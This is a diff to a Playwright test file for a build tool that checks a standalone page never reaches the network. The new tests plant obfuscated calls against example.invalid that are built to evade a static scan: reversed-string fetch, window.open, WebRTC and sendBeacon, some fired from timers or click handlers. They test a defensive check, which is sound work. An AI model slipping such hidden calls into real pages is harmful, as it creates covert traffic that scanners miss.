@@ -15,7 +15,6 @@ import { chromium, type Browser } from 'playwright';
 
 import { buildStandalone, type BuildResult } from '../../src/build/index.js';
 import { CSP_META, NetworkReached } from '../../src/build/network.js';
-import { SHIPPED_ENCODINGS } from '../../src/view/encodings/shipped.js';
 
 const repo = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
 const relocationJson = JSON.parse(await readFile(join(repo, 'examples', 'relocation.json'), 'utf8'));
@@ -69,8 +68,14 @@ describe('the page carries the policy', () => {
     expect(at).toBeLessThan(built.html.indexOf('</head>'));
   });
 
-  it('and was exercised in Chromium under every shipped encoding', () => {
-    expect(built.checked).toEqual({ by: 'browser', encodings: SHIPPED_ENCODINGS.map((e) => e.id) });
+  it('and was exercised in Chromium under every encoding the page registers, which the shipped page reads from its matrix', () => {
+    expect(built.checked).toEqual({ by: 'browser', encodings: ['text-only'], couldNotDraw: [] });
+  });
+
+  it('an encoding the page does not register is a failure, not a pass that ran nothing', async () => {
+    const failure = await buildStandalone(relocationJson, { checkEncodings: ['value'] }).catch((e: unknown) => e);
+    expect(failure).toBeInstanceOf(NetworkReached);
+    expect((failure as NetworkReached).findings.join('\n')).toMatch(/encoding "value": the page does not register it/);
   });
 
   it('which the browser enforces: a fetch from the opened file is refused, not merely absent', async () => {
@@ -125,6 +130,23 @@ describe('a planted network call fails the build', () => {
     expect((failure as NetworkReached).message).toMatch(/a fetch\(\) call: .*fetch\(/);
   });
 
+  // Each hidden from the scan: the browser check is what must catch them.
+  for (const [what, reach] of [
+    ['a fetch put off with a timer', "setTimeout(() => globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/' + alt).catch(() => {}), 2500)"],
+    ['a fetch in a click handler', "document.addEventListener('click', () => globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/').catch(() => {}), { once: true })"],
+    ['a new window, which no CSP governs', "window[[...'nepo'].reverse().join('')]('https://example.invalid/' + alt)"],
+    ['a WebRTC connection, which no CSP governs', "try { new window[[...'noitcennoCreePCTR'].reverse().join('')]({ iceServers: [{ urls: 'stun:127.0.0.1:9' }] }); } catch {}"],
+  ] as const) {
+    it(`${what} fails it`, async () => {
+      const failure = await buildStandalone(relocationJson, { entry: await plantedEntry(what.replace(/\W+/g, '-'), reach) }).catch((e: unknown) => e);
+      expect(failure, what).toBeInstanceOf(NetworkReached);
+      const { findings } = failure as NetworkReached;
+      expect(findings.some((f) => f.startsWith('encoding "value"')), what).toBe(true);
+      // Nothing else: the page as built, which never draws the planted renderer, passed.
+      expect(findings.filter((f) => !f.startsWith('encoding "value"')), what).toEqual([]);
+    });
+  }
+
   it('a sendBeacon hidden from the scan fails it too: the violation surfaces as a console error', async () => {
     const entry = await plantedEntry('beacon', "navigator[[...'nocaeBdnes'].reverse().join('')]('https://example.invalid/', alt)");
     const failure = await buildStandalone(relocationJson, { entry }).catch((e: unknown) => e);
@@ -136,6 +158,6 @@ describe('a planted network call fails the build', () => {
     const quoting = structuredClone(relocationJson);
     quoting.subject.question = 'Does fetch("https://example.invalid/") appear here?';
     const { checked } = await buildStandalone(quoting, { check: 'static' });
-    expect(checked).toEqual({ by: 'static', encodings: [] });
+    expect(checked).toEqual({ by: 'static', encodings: [], couldNotDraw: [] });
   });
 });
